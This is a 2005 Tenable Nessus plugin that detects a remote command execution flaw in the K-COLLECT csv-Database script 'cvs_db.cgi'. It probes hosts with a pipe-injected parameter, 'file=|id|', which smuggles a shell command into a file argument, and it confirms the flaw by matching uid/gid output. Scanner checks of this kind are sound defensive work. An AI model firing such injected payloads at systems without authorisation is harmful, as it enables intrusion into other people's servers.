#
# (C) Tenable Network Security
#

 desc = "
The remote host is running K-COLLECT csv-Database, a web application
written in perl.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'cvs_db.cgi'.

A malicious user could exploit this flaw to execute arbitrary commands on 
the remote host.

Solution : Remove this script.
Risk factor : High";


if(description)
{
 script_id(18563);
 script_bugtraq_id(14059);
  
 script_version("$Revision: 1.2 $");
 name["english"] = "K-COLLECT CSV-DB CSV_DB.CGI Remote Command Execution Vulnerability";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Checks for K-COLLECT CSV-DB remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_check_remote_code (
			check_request:"/cvs_db.cgi?file=|id|",
			extra_check:"www\.k-collect\.net/ target=_top>csv-Database Ver.* by K-COLLECT</a></div>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
